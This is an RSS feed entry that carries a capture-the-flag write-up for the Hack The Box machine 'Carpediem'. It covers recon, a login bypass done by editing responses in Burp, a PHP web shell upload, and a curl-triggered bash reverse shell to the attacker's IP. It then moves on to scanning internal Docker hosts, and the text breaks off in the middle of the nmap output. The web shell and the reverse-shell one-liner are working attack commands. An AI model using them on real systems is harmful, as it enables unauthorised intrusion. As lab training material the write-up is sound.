<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on MØst Xeon</title>
        <link>https://mostxeon.github.io/posts/</link>
        <description>Recent content in Posts on MØst Xeon</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <lastBuildDate>Fri, 02 Dec 2022 07:44:37 +0200</lastBuildDate>
        <atom:link href="https://mostxeon.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>Carpediem Write-Up</title>
            <link>https://mostxeon.github.io/posts/carpediem/</link>
            <pubDate>Fri, 02 Dec 2022 07:44:37 +0200</pubDate>
            
            <guid>https://mostxeon.github.io/posts/carpediem/</guid>
            <description>false</description>
            <content type="html"><![CDATA[<h2 id="ininitial-recon">Ininitial Recon</h2>
<h3 id="nmap">Nmap</h3>
<p>Starting with a full tcp port scan, I got the following results:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -p- -A 10.10.11.167
</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-12-02 07:41 EET
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.167
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.12s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65533</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 962176f72dc5f04ee0a8dfb4d95e4526 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> b16de3fada10b97b9e57535c5bb76006 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 6a1696d80529d590bf6b2a0932dc364f <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Comming Soon
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 427.09 seconds
</span></span></code></pre></div><p>It looks like only ports <em>22 running ssh</em> and <em>80 running a webserver</em> are open.</p>
<h3 id="surfin-the-webpage">Surfin The Webpage</h3>
<p>The page on port <em>80</em> appears to be a static webpage that discloses the domain of <em>carpediem.htb</em>.</p>
<p><img src="home_page.png" alt="Home Page"></p>
<p>So, I&rsquo;ll add it to my <em>/etc/hosts</em>:</p>
<p><code>echo -e '10.10.11.167\tcarpediem.htb' | sudo tee -a /etc/hosts</code></p>
<h3 id="sub-domain-enumeration">Sub-Domain Enumeration</h3>
<p>Since I have the main domain of the web server, I&rsquo;ll try to look for any hidden subdomains using gobuster:</p>
<p><code>gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://carpediem.htb --append-domain</code></p>
<p><img src="gobuster_vhost_bruteforce.png" alt="Gobuster Vhost Scann"></p>
<p><em>portal.carpediem.htb</em> has been found, so I&rsquo;ll also add it to my <em>/etc/hosts</em>.</p>
<p><code>echo -e '10.10.11.167\tportal.carpediem.htb' | sudo tee -a /etc/hosts</code></p>
<h2 id="webserver-enumeration">Webserver Enumeration</h2>
<p>The website on this new subdomain, appears to be a <em>Motorcycle Store</em>, having a <em>Login</em> and <em>Book this Bike</em> functionalities, however I need to be logged in order to book a bike.</p>
<p><img src="clicking_on_bike.png" alt="Clicking On Bike"></p>
<p><img src="seeing_book_this_bike_and_login.png" alt="Viewing Functionalities"></p>
<p>I tried to bruteforce directories using <code>gobuster</code>, and this what I found:</p>
<p><code>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://portal.carpediem.htb0</code>
<img src="portal_gobuster_dir_bruteforce.png" alt="Gobuster Portal Directory Brutefoce"></p>
<p>If I surf to the admin directory from firefox, I get redireted to the login page:</p>
<p><img src="redirected_to_login.png" alt="Got redirected"></p>
<h3 id="bypassing-login">Bypassing Login</h3>
<p>But if I use <code>curl</code> with <code>-v</code> option to see the headers, I can see that the response is <em>200 ok</em>, and the presence of a <em>javascript</em> tag that displays the <em>login</em> page to me, and looks like the content of the admin page are being sent but aren&rsquo;t displayed because of these tags:</p>
<p><code>curl http://portal.carpediem.htb/admin/ -v</code></p>
<p><img src="noticing_script_tags.png" alt="Noticing Response and Script Tags"></p>
<p>This means that if I remove these tags from the server&rsquo;s response, I can bypass this login mechanism and get to the admin page.
So what I&rsquo;ll do is to intercept the response comming from the server using <em>Burp Suite</em> and make a rule to remove the tags before forwarding the response back to my firefox.</p>
<p><img src="Clicking_add_rule_burp_suite.png" alt="Burp Suite"></p>
<p><img src="adding_rule.png" alt="Adding Rule In Burp"></p>
<p><img src="seeing_rule.png" alt="Seeing Rule"></p>
<p><img src="forward_trafic_from_firefox.png" alt="Forwarding Traffic To Burp"></p>
<p><img src="bypassed_login.png" alt="Bypassing Login"></p>
<h2 id="getting-rce">Getting RCE</h2>
<h3 id="finding-upload-functionality">Finding Upload Functionality</h3>
<p>Cycling through the pages, I noticed that there is an <em>upload report</em> functionality, however it is in development:</p>
<p><img src="noticing_upload_function.png" alt="Noticing Upload Functionality"></p>
<p>But clicking on add then continue gives an error:</p>
<p><img src="dev_error.png" alt="Dev Error"></p>
<p>After inspecting the source code with <em>[CTRL + u]</em>, I saw a javascript upload function that appears to be uploading a file to <em>classes/Users.php?f=upload</em>:</p>
<p><img src="javascript_upload_function.png" alt="Javascript Upload Function"></p>
<p>If I try to access the url, an error like this will occur:</p>
<p><img src="accessing_upload_url_get.png" alt="Accessing Upload URL"></p>
<p>If I try to upload a file using <code>curl</code>, I will get an error about missing <em>file_upload</em> parameter, so after changing the parameter I can upload a php shell and get command execution:</p>
<h3 id="uploading-php-file-and-getting-rce">Uploading PHP File And Getting RCE</h3>
<p><img src="uploading_file_using_curl.png" alt="Uploading Shell.php"></p>
<p><img src="getting_command_execution.png" alt="Getting Command Execution"></p>
<p>Now, I can try to get a reverse shell back to my kali:</p>
<pre tabindex="0"><code>$ echo &#39;&lt;?php system($_GET[&#34;cmd&#34;]);?&gt;&#39; &gt; shell.php
$ curl -XPOST http://portal.carpediem.htb/classes/Users.php?f=upload -F &#34;file_upload=@shell.php&#34;
$ curl http://portal.carpediem.htb/uploads/1670042280_shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.16.23/1234%200%3E%261%27
</code></pre><p><img src="getting_reverse_shell.png" alt="Getting Reverse Shell"></p>
<h2 id="enumerating-in-docker">Enumerating In Docker</h2>
<h3 id="scanning-other-hosts-using-static-nmap">Scanning Other Hosts Using Static Nmap</h3>
<p>But it looks like I am in a docker container now, and it appears from reading the <em>/etc/hosts</em> file that there are more than one container.</p>
<p>So I&rsquo;ll upload a static <code>nmap</code> binary, and try to scan a range of ip addresses to see who is up and what services are running on each container:</p>
<ul>
<li>You can either compile your version of <em>nmap</em> or try to find it online. I found one in this 

<a href="https://github.com/ernw/static-toolbox" target="_blank"><em>repo</em></a>: <em>

<a href="https://github.com/ernw/static-toolbox/releases/download/nmap-v7.91SVN/nmap-7.91SVN-x86_64-portable.zip" target="_blank">https://github.com/ernw/static-toolbox/releases/download/nmap-v7.91SVN/nmap-7.91SVN-x86_64-portable.zip</a></em>.</li>
<li>First I&rsquo;ll get a fully interactive shell using
<pre tabindex="0"><code>$ python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
$ [CTRL + z]
$ stty raw -echo fg
$ [Enter]
</code></pre><img src="getting_fully_interactive_shell.png" alt="Getting Fully Interactive Shell"></li>
</ul>
<p>In order for nmap to work properly with all the scripts and everything, I need to also upload the directory containing nmap scripts:</p>
<p><img src="uploading_nmap.png" alt="Uploading Nmap"></p>
<p>Now when I need to run <code>nmap</code>, I need to specify the data diretory where the scripts are located. Here I&rsquo;ll scan the subnet <em>172.17.0.0/28</em> which ranges from <em>172.17.0.1</em> to <em>172.17.0.16</em> since my guest is that there is no more than 16 docker container on such a box:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>www-data@3c371615b7aa:/tmp$ chmod +x nmap
</span></span><span style="display:flex;"><span>www-data@3c371615b7aa:/tmp$ ./nmap -A -p- --datadir data 172.17.0.0/28
</span></span><span style="display:flex;"><span>Starting Nmap 7.91SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-12-03 10:54 UTC
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 172.17.0.1
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.000097s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65533</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 96:21:76:f7:2d:c5:f0:4e:e0:a8:df:b4:d9:5e:45:26 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> b1:6d:e3:fa:da:10:b9:7b:9e:57:53:5c:5b:b7:60:06 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 6a:16:96:d8:05:29:d5:90:bf:6b:2a:09:32:dc:36:4f <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Comming Soon
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 172.17.0.2
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00041s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65532</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT    STATE SERVICE  VERSION
</span></span><span style="display:flex;"><span>21/tcp  open  ftp      vsftpd 3.0.3
</span></span><span style="display:flex;"><span>|_ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ftp-syst: 
</span></span><span style="display:flex;"><span>|   STAT: 
</span></span><span style="display:flex;"><span>| FTP server status:
</span></span><span style="display:flex;"><span>|      Connected to 172.17.0.6
</span></span><span style="display:flex;"><span>|      Logged in as ftp
</span></span><span style="display:flex;"><span>|      TYPE: ASCII
</span></span><span style="display:flex;"><span>|      No session bandwidth limit
</span></span><span style="display:flex;"><span>|      Session timeout in seconds is <span style="color:#ae81ff">300</span>
</span></span><span style="display:flex;"><span>|      Control connection is plain text
</span></span><span style="display:flex;"><span>|      Data connections will be plain text
</span></span><span style="display:flex;"><span>|      At session startup, client count was <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>|      vsFTPd 3.0.3 - secure, fast, stable
</span></span><span style="display:flex;"><span>|_End of status
</span></span><span style="display:flex;"><span>80/tcp  open  http     Apache httpd 2.4.48 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.48 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Apache2 Ubuntu Default Page: It works
</span></span><span style="display:flex;"><span>443/tcp open  ssl/http Apache httpd 2.4.48 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
</span></span><span style="display:flex;"><span>|_http-generator: Backdrop CMS <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>https://backdropcms.org<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| http-robots.txt: <span style="color:#ae81ff">22</span> disallowed entries <span style="color:#f92672">(</span><span style="color:#ae81ff">15</span> shown<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| /core/ /profiles/ /README.md /web.config /admin 
</span></span><span style="display:flex;"><span>| /comment/reply /filter/tips /node/add /search /user/register 
</span></span><span style="display:flex;"><span>|_/user/password /user/login /user/logout /?q<span style="color:#f92672">=</span>admin /?q<span style="color:#f92672">=</span>comment/reply
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.48 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Home | backdrop.carpediem.htb
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>backdrop.carpediem.htb/organizationName<span style="color:#f92672">=</span>Internet Widgits Pty Ltd/stateOrProvinceName<span style="color:#f92672">=</span>Some-State/countryName<span style="color:#f92672">=</span>US
</span></span><span style="display:flex;"><span>| Not valid before: 2022-04-07T17:12:51
</span></span><span style="display:flex;"><span>|_Not valid after:  2025-01-02T17:12:51
</span></span><span style="display:flex;"><span>| tls-alpn: 
</span></span><span style="display:flex;"><span>|_  http/1.1
</span></span><span style="display:flex;"><span>Service Info: OS: Unix
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 172.17.0.3
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00039s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65534</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT      STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>27017/tcp open  mongodb MongoDB 5.0.6
</span></span><span style="display:flex;"><span>| mongodb-databases: 
</span></span><span style="display:flex;"><span>|   ok <span style="color:#f92672">=</span> 1.0
</span></span><span style="display:flex;"><span>|   totalSizeMb <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>|   databases
</span></span><span style="display:flex;"><span>|     <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>|       name <span style="color:#f92672">=</span> admin
</span></span><span style="display:flex;"><span>|       empty <span style="color:#f92672">=</span> false
</span></span><span style="display:flex;"><span>|       sizeOnDisk <span style="color:#f92672">=</span> <span style="color:#ae81ff">135168</span>
</span></span><span style="display:flex;"><span>|     <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>|       name <span style="color:#f92672">=</span> trudesk
</span></span><span style="display:flex;"><span>|       empty <span style="color:#f92672">=</span> false
</span></span><span style="display:flex;"><span>|       sizeOnDisk <span style="color:#f92672">=</span> <span style="color:#ae81ff">1118208</span>
</span></span><span style="display:flex;"><span>|     <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>|       name <span style="color:#f92672">=</span> local
</span></span><span style="display:flex;"><span>|       empty <span style="color:#f92672">=</span> false
</span></span><span style="display:flex;"><span>|       sizeOnDisk <span style="color:#f92672">=</span> <span style="color:#ae81ff">90112</span>
</span></span><span style="display:flex;"><span>|     <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>|       name <span style="color:#f92672">=</span> config
</span></span><span style="display:flex;"><span>|       empty <span style="color:#f92672">=</span> false
</span></span><span style="display:flex;"><span>|       sizeOnDisk <span style="color:#f92672">=</span> <span style="color:#ae81ff">36864</span>
</span></span><span style="display:flex;"><span>|_  totalSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">1380352</span>
</span></span><span style="display:flex;"><span>|_mongodb-info: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> mysql <span style="color:#f92672">(</span>172.17.0.4<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.000088s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65533</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT      STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>3306/tcp  open  mysql   MySQL 8.0.27
</span></span><span style="display:flex;"><span>| mysql-info: 
</span></span><span style="display:flex;"><span>|   Protocol: <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span>|   Version: 8.0.27
</span></span><span style="display:flex;"><span>|   Thread ID: <span style="color:#ae81ff">874</span>
</span></span><span style="display:flex;"><span>|   Capabilities flags: <span style="color:#ae81ff">65535</span>
</span></span><span style="display:flex;"><span>|   Some Capabilities: Speaks41ProtocolOld, Support41Auth, IgnoreSpaceBeforeParenthesis, SupportsTransactions, SupportsCompression, ODBCClient, IgnoreSigpipes, ConnectWithDatabase, SwitchToSSLAfterHandshake, FoundRows, InteractiveClient, SupportsLoadDataLocal, Speaks41ProtocolNew, LongColumnFlag, DontAllowDatabaseTableColumn, LongPassword, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
</span></span><span style="display:flex;"><span>|   Status: Autocommit
</span></span><span style="display:flex;"><span>|   Salt: 4|OQ1<span style="color:#f92672">(</span>	:<span style="color:#f92672">]</span>dgo1COl<span style="color:#ae81ff">\x</span>1E~<span style="color:#ae81ff">\x</span>16N
</span></span><span style="display:flex;"><span>|_  Auth Plugin Name: caching_sha2_password
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>MySQL_Server_8.0.27_Auto_Generated_Server_Certificate
</span></span><span style="display:flex;"><span>| Not valid before: 2021-10-27T03:20:43
</span></span><span style="display:flex;"><span>|_Not valid after:  2031-10-25T03:20:43
</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
</span></span><span style="display:flex;"><span>33060/tcp open  mysqlx?
</span></span><span style="display:flex;"><span>| fingerprint-strings: 
</span></span><span style="display:flex;"><span>|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
</span></span><span style="display:flex;"><span>|     Invalid message<span style="color:#e6db74">&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     HY000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   LDAPBindReq: 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     *Parse error unserializing protobuf message&#34;</span>
</span></span><span style="display:flex;"><span>|     HY000
</span></span><span style="display:flex;"><span>|   oracle-tns: 
</span></span><span style="display:flex;"><span>|     Invalid message-frame.<span style="color:#e6db74">&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_    HY000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF-Port33060-TCP:V=7.91SVN%I=7%D=12/3%Time=638B2B0C%P=x86_64-pc-linux-musl
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:%r(NULL,9,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;)%r(GenericLines,9,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>SF:x0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;)%r(GetRequest,9,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;)%r(HT
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:TPOptions,9,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;)%r(RTSPRequest,9,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0</span>
</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;)%r(RPCCheck,9,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;)%r(DNS
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:VersionBindReqTCP,9,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;)%r(DNSStatusRequestT
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:CP,2B,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0\x</span>1e<span style="color:#ae81ff">\0\0\0\x</span>01<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>10<span style="color:#ae81ff">\x</span>88<span style="color:#e6db74">&#39;\x1a\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x0fInvalid\x20message\&#34;\x05HY000&#34;)%r(Help,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\0&#34;)%r(SSLSessionReq,2B,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x01\x10\x88&#39;</span><span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\x</span>0fInvalid<span style="color:#ae81ff">\x</span>20message<span style="color:#ae81ff">\&#34;\x</span>05HY000<span style="color:#e6db74">&#34;)%r(TerminalServerCo
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:okie,9,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;)%r(TLSSessionReq,2B,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>
</span></span><span style="display:flex;"><span>SF:0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0\x</span>1e<span style="color:#ae81ff">\0\0\0\x</span>01<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>10<span style="color:#ae81ff">\x</span>88<span style="color:#e6db74">&#39;\x1a\x0fInvalid\x20messa
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ge\&#34;\x05HY000&#34;)%r(Kerberos,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(SMBProgN
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:eg,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(X11Probe,2B,&#34;\x05\0\0\0\x0b\x08\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;</span><span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\x</span>0fInvalid<span style="color:#ae81ff">\x</span>20message<span style="color:#ae81ff">\&#34;\x</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>SF:5HY000<span style="color:#e6db74">&#34;)%r(FourOhFourRequest,9,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;)%r(LPDStr
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ing,9,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;)%r(LDAPSearchReq,2B,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>SF:b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0\x</span>1e<span style="color:#ae81ff">\0\0\0\x</span>01<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>10<span style="color:#ae81ff">\x</span>88<span style="color:#e6db74">&#39;\x1a\x0fInvalid\x20messag
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:e\&#34;\x05HY000&#34;)%r(LDAPBindReq,46,&#34;\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x01\x08\x01\x10\x88&#39;</span><span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\*</span>Parse<span style="color:#ae81ff">\x</span>20error<span style="color:#ae81ff">\x</span>20unserializing<span style="color:#ae81ff">\x</span>20protobuf<span style="color:#ae81ff">\x</span>
</span></span><span style="display:flex;"><span>SF:20message<span style="color:#ae81ff">\&#34;\x</span>05HY000<span style="color:#e6db74">&#34;)%r(SIPOptions,9,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;)%r
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:(LANDesk-RC,9,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;)%r(TerminalServer,9,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\
